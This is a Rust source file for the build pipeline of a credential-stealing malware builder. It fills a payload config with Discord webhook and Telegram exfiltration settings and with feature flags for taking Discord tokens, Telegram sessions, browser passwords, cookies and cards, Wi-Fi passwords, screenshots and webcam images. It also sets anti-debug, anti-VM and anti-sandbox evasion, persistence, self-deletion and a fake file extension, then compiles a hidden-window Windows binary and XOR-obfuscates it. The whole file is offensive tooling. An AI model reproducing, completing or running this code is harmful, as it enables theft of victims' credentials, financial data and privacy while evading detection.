/// Build pipeline: generates config, compiles payload, optionally encrypts it.
///
/// Designed to run in a background thread. Progress is reported via a
/// `Sender<String>` channel — each message is a log line.

use std::fs;
use std::path::{Path, PathBuf};
use std::process::Command;
use std::sync::mpsc::Sender;
use std::thread;

use crate::state::AppState;

// ── Public API ────────────────────────────────────────────────────────────────

/// Start the build pipeline on a background thread.
/// Returns a JoinHandle that resolves to `Ok(output_path)` or `Err(message)`.
pub fn start_build(
    state: AppState,
    log_tx: Sender<String>,
) -> thread::JoinHandle<Result<String, String>> {
    thread::spawn(move || run_build(state, log_tx))
}

// ── Internal implementation ───────────────────────────────────────────────────

fn log(tx: &Sender<String>, msg: impl Into<String>) {
    let _ = tx.send(msg.into());
}

fn run_build(state: AppState, tx: Sender<String>) -> Result<String, String> {
    log(&tx, "[..] Starting build pipeline...");

    // ── 1. Locate project root ────────────────────────────────────────────────
    let exe_dir = std::env::current_exe()
        .ok()
        .and_then(|p| p.parent().map(|p| p.to_path_buf()))
        .unwrap_or_else(|| PathBuf::from("."));

    // Walk up to find the directory that contains "payload/"
    let project_root = find_project_root(&exe_dir)
        .ok_or_else(|| "Could not locate project root (payload/ directory not found)".to_string())?;

    let payload_dir = project_root.join("payload");
    let cpp_dir     = project_root.join("cpp");

    // ── 2. Create output directory ────────────────────────────────────────────
    let output_dir = project_root.join("output");
    fs::create_dir_all(&output_dir)
        .map_err(|e| format!("Failed to create output dir: {e}"))?;
    log(&tx, "[OK] Output directory ready");

    // ── 3. Generate config.h ──────────────────────────────────────────────────
    log(&tx, "[..] Generating config.h...");
    let config_h = render_config(&state);
    let config_path = payload_dir.join("config.h");
    fs::write(&config_path, &config_h)
        .map_err(|e| format!("Failed to write config.h: {e}"))?;
    log(&tx, "[OK] config.h written");

    // ── 4. Find a C++ compiler ────────────────────────────────────────────────
    log(&tx, "[..] Locating C++ compiler...");
    let compiler = find_compiler()
        .ok_or_else(|| "[!] No C++ compiler found. Install MSVC (cl.exe) or MinGW (g++.exe)".to_string())?;
    log(&tx, format!("[OK] Compiler: {}", compiler.display()));

    // ── 5. Build compiler command ─────────────────────────────────────────────
    let output_name = state.compiler.output_name.clone();
    let output_path = output_dir.join(&output_name);

    // Collect all .cpp source files
    let sources: Vec<PathBuf> = {
        let mut v = vec![payload_dir.join("main.cpp")];
        for name in &["discord.cpp", "browsers.cpp", "system.cpp", "network.cpp",
                       "telegram.cpp", "delivery.cpp"] {
            v.push(cpp_dir.join(name));
        }
        v
    };

    // SQLite is compiled separately as C
    let sqlite_c = cpp_dir.join("sqlite3.c");

    let is_msvc = compiler.file_name()
        .and_then(|n| n.to_str())
        .map(|n| n.to_ascii_lowercase().contains("cl"))
        .unwrap_or(false);

    log(&tx, "[..] Compiling...");

    let status = if is_msvc {
        build_with_msvc(&compiler, &sources, &sqlite_c, &output_path, &state, &tx)?
    } else {
        build_with_gcc(&compiler, &sources, &sqlite_c, &output_path, &state, &tx)?
    };

    if !status {
        return Err("[!] Compilation failed — check logs above".to_string());
    }
    log(&tx, "[OK] Compilation successful");

    // ── 6. XOR-encrypt the binary (optional) ─────────────────────────────────
    let final_path = if state.compiler.encrypt_payload {
        log(&tx, "[..] Applying XOR encryption layer...");
        let enc_path = output_dir.join(format!("{output_name}.enc"));
        xor_encrypt_file(&output_path, &enc_path, XOR_KEY)?;
        // Wrap with loader stub (simple: just rename back)
        fs::rename(&enc_path, &output_path)
            .map_err(|e| format!("Rename after XOR failed: {e}"))?;
        log(&tx, "[OK] Encrypted");
        output_path.clone()
    } else {
        output_path.clone()
    };

    log(&tx, format!("[OK] Build complete: {}", final_path.display()));
    Ok(final_path.to_string_lossy().to_string())
}

// ── Compiler helpers ──────────────────────────────────────────────────────────

fn find_project_root(start: &Path) -> Option<PathBuf> {
    // Walk up from the exe's directory until we find the directory
    // that contains both "payload/" and "cpp/" subdirectories.
    let mut cur = start.to_path_buf();
    for _ in 0..12 {
        if cur.join("payload").exists() && cur.join("cpp").exists() {
            return Some(cur);
        }
        if !cur.pop() { break; }
    }

    // Also try the current working directory (useful when running `cargo run`)
    if let Ok(cwd) = std::env::current_dir() {
        let mut cur2 = cwd;
        for _ in 0..6 {
            if cur2.join("payload").exists() && cur2.join("cpp").exists() {
                return Some(cur2);
            }
            if !cur2.pop() { break; }
        }
    }

    None
}

fn find_compiler() -> Option<PathBuf> {
    // 1. cl.exe (MSVC) — search in PATH
    if let Ok(out) = Command::new("cl.exe").arg("/?").output() {
        if out.status.success() || !out.stderr.is_empty() {
            return Some(PathBuf::from("cl.exe"));
        }
    }

    // 2. g++ (MinGW / MSYS2)
    if let Ok(out) = Command::new("g++").arg("--version").output() {
        if out.status.success() {
            return Some(PathBuf::from("g++"));
        }
    }

    // 3. x86_64-w64-mingw32-g++ (cross-compiler)
    if let Ok(out) = Command::new("x86_64-w64-mingw32-g++").arg("--version").output() {
        if out.status.success() {
            return Some(PathBuf::from("x86_64-w64-mingw32-g++"));
        }
    }

    None
}

fn build_with_msvc(
    cl: &Path,
    sources: &[PathBuf],
    sqlite_c: &Path,
    output: &Path,
    state: &AppState,
    tx: &Sender<String>,
) -> Result<bool, String> {
    let mut cmd = Command::new(cl);
    cmd.arg("/nologo")
       .arg("/std:c++17")
       .arg("/EHsc")
       .arg("/W0")
       .arg("/O2")
       .arg("/MT");              // static runtime — no VCRUNTIME DLL dependency

    if state.compiler.anti_debug { cmd.arg("/D").arg("ZED_ANTI_DEBUG=1"); }
    if state.compiler.anti_vm    { cmd.arg("/D").arg("ZED_ANTI_VM=1"); }
    if state.compiler.anti_sandbox { cmd.arg("/D").arg("ZED_ANTI_SANDBOX=1"); }

    for src in sources { cmd.arg(src); }
    // SQLite compiled as C
    cmd.arg("/TC").arg(sqlite_c);

    cmd.arg("/link")
       .arg("/SUBSYSTEM:WINDOWS")
       .arg("/OUT:").arg(output)
       .arg("bcrypt.lib")
       .arg("crypt32.lib")
       .arg("winhttp.lib")
       .arg("wlanapi.lib")
       .arg("iphlpapi.lib")
       .arg("psapi.lib");

    let out = cmd.output().map_err(|e| format!("Failed to run cl.exe: {e}"))?;
    let _ = tx.send(String::from_utf8_lossy(&out.stdout).to_string());
    if !out.status.success() {
        let _ = tx.send(String::from_utf8_lossy(&out.stderr).to_string());
    }
    Ok(out.status.success())
}

fn build_with_gcc(
    gpp: &Path,
    sources: &[PathBuf],
    sqlite_c: &Path,
    output: &Path,
    state: &AppState,
    tx: &Sender<String>,
) -> Result<bool, String> {
    let mut cmd = Command::new(gpp);
    cmd.arg("-std=c++17")
       .arg("-O2")
       .arg("-w")
       .arg("-static")
       .arg("-DUNICODE")
       .arg("-D_UNICODE")
       .arg("-mwindows");   // /SUBSYSTEM:WINDOWS equivalent

    if state.compiler.anti_debug   { cmd.arg("-DZED_ANTI_DEBUG=1"); }
    if state.compiler.anti_vm      { cmd.arg("-DZED_ANTI_VM=1"); }
    if state.compiler.anti_sandbox { cmd.arg("-DZED_ANTI_SANDBOX=1"); }

    for src in sources { cmd.arg(src); }
    cmd.arg("-x").arg("c").arg(sqlite_c);  // compile SQLite as C

    cmd.arg("-o").arg(output)
       .arg("-lbcrypt")
       .arg("-lcrypt32")
       .arg("-lwinhttp")
       .arg("-lwlanapi")
       .arg("-liphlpapi")
       .arg("-lpsapi");

    let out = cmd.output().map_err(|e| format!("Failed to run g++: {e}"))?;
    let _ = tx.send(String::from_utf8_lossy(&out.stdout).to_string());
    if !out.status.success() {
        let _ = tx.send(String::from_utf8_lossy(&out.stderr).to_string());
    }
    Ok(out.status.success())
}

// ── XOR encryption ────────────────────────────────────────────────────────────

const XOR_KEY: &[u8] = b"\xDE\xAD\xBE\xEF\xCA\xFE\xBA\xBE\x4A\x3F\x1C\xE8\x77\x2A\x90\xD5";

fn xor_encrypt_file(input: &Path, output: &Path, key: &[u8]) -> Result<(), String> {
    let data = fs::read(input)
        .map_err(|e| format!("Failed to read binary for XOR: {e}"))?;

    let encrypted: Vec<u8> = data.iter().enumerate()
        .map(|(i, &b)| b ^ key[i % key.len()])
        .collect();

    fs::write(output, &encrypted)
        .map_err(|e| format!("Failed to write XOR-encrypted binary: {e}"))?;
    Ok(())
}

// ── config.h generator ────────────────────────────────────────────────────────

fn b(v: bool) -> &'static str { if v { "1" } else { "0" } }

fn render_config(s: &AppState) -> String {
    let tmpl = include_str!("../payload/config_template.h");
    tmpl.replace("{{DISCORD_WEBHOOK}}",        &s.delivery.discord_webhook)
        .replace("{{TELEGRAM_TOKEN}}",          &s.delivery.telegram_token)
        .replace("{{TELEGRAM_CHAT_ID}}",        &s.delivery.telegram_chat_id)
        .replace("{{USE_DISCORD}}",             b(s.delivery.use_discord))
        .replace("{{USE_TELEGRAM}}",            b(s.delivery.use_telegram))
        // Discord
        .replace("{{FEAT_DISCORD_TOKENS}}",     b(s.features.discord_tokens))
        .replace("{{FEAT_DISCORD_NITRO}}",      b(s.features.discord_nitro_check))
        .replace("{{FEAT_DISCORD_FRIENDS}}",    b(s.features.discord_friends))
        // Telegram
        .replace("{{FEAT_TELEGRAM_SESSIONS}}",  b(s.features.telegram_sessions))
        // Browsers
        .replace("{{FEAT_BROWSER_COOKIES}}",    b(s.features.browser_cookies))
        .replace("{{FEAT_BROWSER_PASSWORDS}}",  b(s.features.browser_passwords))
        .replace("{{FEAT_BROWSER_HISTORY}}",    b(s.features.browser_history))
        .replace("{{FEAT_BROWSER_CARDS}}",      b(s.features.browser_cards))
        .replace("{{FEAT_BROWSER_AUTOFILL}}",   b(s.features.browser_autofill))
        // Browser targets
        .replace("{{TARGET_CHROME}}",           b(s.features.target_chrome))
        .replace("{{TARGET_FIREFOX}}",          b(s.features.target_firefox))
        .replace("{{TARGET_EDGE}}",             b(s.features.target_edge))
        .replace("{{TARGET_BRAVE}}",            b(s.features.target_brave))
        .replace("{{TARGET_OPERA}}",            b(s.features.target_opera))
        // System
        .replace("{{FEAT_SYSTEM_INFO}}",        b(s.features.system_info))
        .replace("{{FEAT_HARDWARE}}",           b(s.features.hardware_info))
        .replace("{{FEAT_NETWORK}}",            b(s.features.network_info))
        .replace("{{FEAT_SCREENSHOT}}",         b(s.features.screenshot))
        .replace("{{FEAT_WEBCAM}}",             b(s.features.webcam))
        .replace("{{FEAT_CLIPBOARD}}",          b(s.features.clipboard))
        .replace("{{FEAT_WIFI}}",               b(s.features.wifi_passwords))
        .replace("{{FEAT_INSTALLED_APPS}}",     b(s.features.installed_apps))
        .replace("{{FEAT_STARTUP_FILES}}",      b(s.features.startup_files))
        // Evasion
        .replace("{{ANTI_DEBUG}}",              b(s.compiler.anti_debug))
        .replace("{{ANTI_VM}}",                 b(s.compiler.anti_vm))
        .replace("{{ANTI_SANDBOX}}",            b(s.compiler.anti_sandbox))
        .replace("{{MUTEX_ENABLED}}",           b(s.compiler.mutex))
        .replace("{{MUTEX_NAME}}",              &s.compiler.mutex_name)
        // Post-exec
        .replace("{{PERSISTENCE}}",             b(s.compiler.persistence))
        .replace("{{MELT}}",                    b(s.compiler.melt))
        .replace("{{SELF_DESTRUCT}}",           b(s.compiler.self_destruct))
        // Output
        .replace("{{OUTPUT_NAME}}",             &s.compiler.output_name)
        .replace("{{FAKE_EXTENSION}}",          &s.compiler.fake_extension)
}
